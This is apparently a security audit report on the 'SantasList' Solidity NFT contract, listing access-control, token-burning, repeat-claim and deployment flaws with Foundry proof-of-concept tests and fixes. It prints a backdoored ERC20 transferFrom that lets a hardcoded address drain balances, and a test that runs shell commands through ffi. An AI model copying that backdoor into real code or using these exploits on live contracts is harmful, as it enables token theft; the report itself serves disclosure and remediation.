# High

### [H-1] Anyone can call the `SantasList::checkList` function which should only be called by onlySanta

**Description:** Anyone can call the `SantasList::checkList`  while documentation says only Santa should be able to call it. This can be considered as an access control flaw.

**Impact:** 

False Status Assignments: A malicious actor could mark addresses as NICE or EXTRA_NICE without any oversight. This could result in those addresses unfairly receiving NFTs and SantaTokens during the collectPresent process.

Preventing Legitimate Rewards: Conversely, a malicious actor could intentionally mark legitimate addresses as NAUGHTY, preventing them from receiving rewards, even if they are actually NICE or EXTRA_NICE.

One more important thing to note is that, The second check performed by Santa compares the second status against the first. A malicious actor could deliberately set the first status incorrectly, causing the second check to fail and triggering the SantasList__SecondCheckDoesntMatchFirst() error, blocking legitimate users from collecting their rewards.

**Proof Of Concept:**

```solidity
function testAnyoneCanCallcheckList() public {
    
        vm.startPrank(maliciousActor);
        // Malicious actor marking legitmate address status as `NAUGHTY`
        santasList.checkList(user,SantasList.Status.NAUGHTY);
        assert(santasList.getNaughtyOrNiceOnce(user)==SantasList.Status.NAUGHTY);
        vm.stopPrank();

        vm.startPrank(santa);
        vm.expectRevert();
        // The second check performed by Santa makes the legitimate user to be ineligble for the reward
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

```

**Recommended Mitigation:** Use the `SantasList::onlySanta` modifier with the `SantasList::checkList` function, this will ensure that only `Santa` can call this function.

```diff
- function checkList(address person, Status status) external {
+ function checkList(address person, Status status) onlySanta external {
        s_theListCheckedOnce[person] = status;
        emit CheckedOnce(person, status);
    }
```

### [H-2] All addresses are being considered `NICE` by default and resulting in eligble to claim nft from the `SantasList::collectPresent` function 

**Description:** Any address that is part of SantasList contract is having default status of `NICE` which will allow them to claim NFT by using the  `SantasList::collectPresent` function. This is due to the fact that if there's no default value defined for enum then the value at 0th position will be taken as default and will be used and in this case the default value is `NICE`.

**Impact:** This impacts the ablity of the system to distribute the prices. Since, everyonr has the `NICE` status by default anyone can claim the NFT even the users that Santa intended to be on NAUGHTY.

**Proof of Concept:**

```solidity

function testAnyoneCanClaimPresent() public{
        vm.startPrank(user);
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()+1);
        santasList.collectPresent();
        vm.stopPrank();
    }

```

**Recommended Mitigation:** This issue can be resolved by updating the `SantasList::Status` enum, to have its first value or value at 0th index to be `UNKNOWN`. This will ensure all the users have the intial status as `UNKNOWN` and wont be able to claim the NFT from `SantasList::collectPresent` function 

```diff
enum Status {
-        NICE,
+       UNKNOWN,
        EXTRA_NICE,
        NAUGHTY,
-        NOT_CHECKED_TWICE
+        NICE
    }
```

### [H-3] `SantasList::buyPresent` functions allows anyone  to burn someone else's tokens and mint an NFT in SantasList contract.

**Description:** Anyone can call the `SantasList::buyPresent` function with someone's else address that has santa tokens. So, the function will burn the santa tokens of the address passed as param into the function and mint NFT for the address that calls the function.

**Impact:** 
The impact of this vulnerability is considered HIGH as `buyPresent` function allows any malicious user to use someone else's tokens to mint themselves an NFT. 

**Proof Of Concept:**

```solidity

function testAnyoneCanMintNFTUsingOthersTokens()public{

        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();
        
        //Collecting the Present
        vm.startPrank(user);
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
        santasList.collectPresent();
        vm.stopPrank();

        //Spending users token to mint NFT 
        vm.startPrank(maliciousActor);
        santasList.buyPresent(user);
        assert(santasList.balanceOf(maliciousActor)==1);
        assert(santasList.balanceOf(user)==1);
        vm.stopPrank();}

```

**Recommended Mitigation:** This issue can be fixed by burning tokens from the caller and by adding address param in `SantasList::_mintAndIncrement` function

```diff
unction buyPresent(address presentReceiver) external {
-        i_santaToken.burn(presentReceiver);
+        i_santaToken.burn(msg.sender);
-        _mintAndIncrement();
+        _mintAndIncrement(presentReceiver);

    }

-    function _mintAndIncrement() private {
+    function _mintAndIncrement(address presentReceiver) private { 
-    _safeMint(msg.sender, s_tokenCounter++);
+    _safeMint(presentReceiver, s_tokenCounter++);
    }
```

### [H-4] `SantasList::collectPresent` function can be called by `NICE` or `EXTRA_NICE` users multiple times even if they already collected there price once

**Description:** `NICE` or `EXTRA_NICE` can call the `SantasList::collectPresent` to collect there present. In order to prevent users from claiming presents multiple times the below check was implemented.

```solidity
    if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
```
The issue with the this check is that it checks the number of tokens the user is having and if the user is having more than 0 then the user is considered as one who already collected the present. But what the malicious actor can do is transfer the token to any other address and can come back to claim again and since the check checking how much tokens the malicious user holds, this time the user holds 0 balance so the user will be able to claim the NFT again and again.

**Impact:** This can have a high impact, as it allows any `NICE` user to mint as much NFTs as wanted, and it also allows any `EXTRA_NICE` user to mint as much NFTs and SantaTokens as desired.

**Proof Of Concept:**

```solidity

function testNICEorEXTRA_NICECanClaimPresentMultipleTimes() public{
        vm.startPrank(santa);
        santasList.checkList(maliciousActor, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(maliciousActor, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();
        
        //Collecting the Present
        vm.startPrank(maliciousActor);
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
        santasList.collectPresent();
        
        santasList.safeTransferFrom(maliciousActor,user,0);
        //Collecting the present again
        santasList.collectPresent();
        vm.stopPrank();

    }
```

**Recomended Mitigation:** Add the below code to mitigate the issue. SantasList should maintain a mapping to keep track of addresses which already collected present through `SantasList::collectPresent` Function. 

```solidity
mapping(address user => bool) private hasClaimed;
```
Now, modify the collectPresent Function as Follows:

```solidity
    function collectPresent() external {
        require(!hasClaimed[msg.sender], "user already collected present");

        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }

        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
            _mintAndIncrement();
            hasClaimed[msg.sender] = true;
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            hasClaimed[msg.sender] = true;

            return;
        }
        revert SantasList__NotNice();
    }
```

### [H-5] Forked ERC20 solmate contract is used which is vulnerable to malicious code injection inside `transferFrom` function and is inherited in `SantaToken`

**Description:** 

A malicious code is detected in a modified version of the Solmate ERC20 contract inside the `transferFrom` function. The library was forked from the Solmate repository and has been modified to include the malicious code. The `SantaToken` contract inherits this malicious ERC20 contract which brings all the risks inside the SantaToken contract that are associated with the modified ERC20 contract.


```solidity
function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
@>  // hehehe :)
@>  // https://arbiscan.io/tx/0xd0c8688c3bcabd0024c7a52dfd818f8eb656e9e8763d0177237d5beb70a0768d
@>  if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
@>      balanceOf[from] -= amount;
@>      unchecked {
@>          balanceOf[to] += amount;
@>      }
@>      emit Transfer(from, to, amount);
@>      return true;
@>  }

    uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

    if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

    balanceOf[from] -= amount;

    // Cannot overflow because the sum of all user
    // balances can't exceed the max uint256 value.
    unchecked {
        balanceOf[to] += amount;
    }

    emit Transfer(from, to, amount);

    return true;
}
```

**Impact:**
This allows the attacker having the address `0x815F577F1c1bcE213c012f166744937C889DAF17` to transfer tokens from one address to another address, without requiring approval from the `from` address to attacker's address. This can lead to significant financial loss for token holders and can undermine the trust in the SantaToken.

**Proof Of Concept:** 

```solidity
function testMalicousAddressCanTransferTokens(){
    address maliciousActor = 0x815F577F1c1bcE213c012f166744937C889DAF17;
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 

    vm.prank(user);
    santasList.collectPresent();
    // After this the user will have the Santa Tokens

    uint256 userBalance = santaToken.balanceOf(user);
    assertEq(userBalance, 1e18);

    vm.prank(maliciousActor);
    bool success = santaToken.transferFrom(user, maliciousActor, userBalance);

    assert(success == true);
    assertEq(santaToken.balanceOf(user), 0);
    assertEq(santaToken.balanceOf(maliciousActor), userBalance);
}

```

**Recomended Mitigation:**
* Use the ERC20 contract from the official Solmate's library.
* Delete the malicious forked solmate library from the `lib` folder and use the official safe one.
* Refactor the library installs in every place.

### [H-6] Test Suite contains a malicious test allowing data extraction from the user running it 

**Description:**
This testPwned function allows to execute arbitrary commands. If the test suite is run in an environment where ffi is allowed, malicious commands could be executed, potentially causing harm to the environment, such as deleting files or leaking sensitive information. The below is the malcious test it creates a file named as `youve-been-pwned` but there is no reason to keep this test here.

```solidity
function testPwned() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = string.concat("youve-been-pwned");
        cheatCodes.ffi(cmds);
    }
```

**Impact:**

This issue is considered high because it presents a significant risk of sensitive information being leaked or malicious commands being executed.

**Recommended Mitigation:**

* Remove the test from the test suite
* Always used 3rd party programs on the system with caution.

# Medium 

### [M-1] `SantasList::PURCHASED_PRESENT_COST` constant is never used and `SantasList::buyPresent` function buys the present at a cheaper rate

**Description:** The `SantasList::PURCHASED_PRESENT_COST` constant describes the price to purchase the present but this is never used in the code, instead the `SantasList::buyPresent` function gets called it burn `1e18` token to buy the present instead of `2e18` as defined in the `SantasList::PURCHASED_PRESENT_COST` constant.

```solidity
function buyPresent(address presentReceiver) external {
@>  i_santaToken.burn(presentReceiver);
    _mintAndIncrement();
}
```

```solidity
 function burn(address from) external {
        if (msg.sender != i_santasList) {
            revert SantaToken__NotSantasList();
        }
@>        _burn(from, 1e18); 
    }
```

**Impact:**
Protocol mentions that user should be able to buy NFT for 2e18 amount of SantaToken but users can buy NFT for their friends by burning only 1e18 tokens instead of 2e18, thus NFT can be bought at much cheaper rate which is half of the true amount that was expected to buy NFT.

**Recommeded Mitigation:**

In `SantasList::buyPresent` function 

```diff
function buyPresent(address presentReceiver) external {
-   i_santaToken.burn(presentReceiver);
+   i_santaToken.burn(presentReceiver, PURCHASED_PRESENT_COST);
    _mintAndIncrement();
}
```

Instead of hard-coding the amount of value to burn use an argument to specify the amount of value that needs to burned to buy the present.

```diff
- function burn(address from) external {
+ function burn(address from,uint256 amount) external {
        if (msg.sender != i_santasList) {
            revert SantaToken__NotSantasList();
        }
-        _burn(from, 1e18);
+        _burn(from, amount);
    }
}
```

# Low

###[L-1] `SantasList::collectPresent()` function can be called anytime after christmas

**Description:** The documentations specifies that the christmas present should only be collectible with 24 hours before or after christmas. But the present can be minted at anytime after christmas.

```solidity
function collectPresent() external {
@>        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
        if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
            _mintAndIncrement();
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            return;
        }
        revert SantasList__NotNice();
    }
```

**Impact:** This breaks the intended use the protocol. Since the protocol mentions that the present should be collected  with 24 hours before or after christmas but this is getting failed.

**Proof Of Concept:**

```solidity
function testCollectingPresentAfterChristmas() public{
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(1703900189); // Saturday, 30 December 2023 01:36:29

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        vm.stopPrank();
}
```

**Recommeded Mitigation:**
Consider adding a time window for present collection rather than relying on a single timestamp check.

* Update the conditon to allow the claim of present only during 24 hrs before or after christmas.

```solidity
+       if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME - 1 days || block.timestamp > CHRISTMAS_2023_BLOCK_TIME + 1 days) {
```

### [L-2] Incompatibility of Soliidty 0.8.22 with Arbitrum: Deployment failures due to unsupported PUSH0 Opcode

**Description:** The documentation mentions that the contract is going to be deployed on Arbitrum.

```solidity
- Solc Version: 0.8.22
- Chain(s) to deploy contract to: 
  - Arbitrum
- Tokens
  - `SantaToken`
```

The Solidity files use `pragma solidity 0.8.22;`, which, when compiled, utilizes the opcode PUSH0. This opcode is not supported on the Arbitrum network.

<https://docs.arbitrum.io/for-devs/concepts/differences-between-arbitrum-ethereum/solidity-support>

**Impact:**
Prevents the deployment of contracts within the desired network for the project.

**Proof Of Concept:**
In the arbitrum one documentation we can find references to the versions supported by this network: 
<https://docs.arbitrum.io/for-devs/concepts/differences-between-arbitrum-ethereum/solidity-support>

**Recommended Mitigations:**
It is strongly recommended to use network-compatible versions of solidity

### [L-3] Oversized Contract will fail the deployment

**Description:**

`SantasList.sol:SantasList` contract is oversized (56.43 kB). This is due to the fact that the constant variable `TOKEN_URI` is stored in the bytecode, which is `51373` characters in length. (Token URI is a nested Base64 encoding which exceeds the deployable bytecode size for a single contract.)

Oversized contract can't be deployed.

```
forge build --sizes
[⠒] Compiling...
[⠊] Compiling 2 files with 0.8.22
[⠒] Solc 0.8.22 finished in 1.85s
Compiler run successful!
| Contract       | Size (kB) | Margin (kB) |
|----------------|-----------|-------------|
| Math           | 0.086     | 24.49       |
| MockERC20      | 3.69      | 20.886      |
| MockERC721     | 3.827     | 20.749      |
| SantaToken     | 3.324     | 21.252      |
| SantasList     | 56.43     | -31.854     |
| SignedMath     | 0.086     | 24.49       |
| StdStyle       | 0.086     | 24.49       |
| Strings        | 0.086     | 24.49       |
| TokenUri       | 51.615    | -27.039     |
| console        | 0.086     | 24.49       |
| console2       | 0.086     | 24.49       |
| safeconsole    | 0.086     | 24.49       |
| stdError       | 0.592     | 23.984      |
| stdJson        | 0.086     | 24.49       |
| stdMath        | 0.086     | 24.49       |
| stdStorage     | 0.086     | 24.49       |
| stdStorageSafe | 0.086     | 24.49       |
```

**Impact:**
Contract can't be deployed due to the `TOKEN_URI` size.

**Recommended Mitigations:**
`TOKEN_URI` should be modified to prevent the oversized contract. Ideally, this can be an `ipfs` url, which will be shorter.
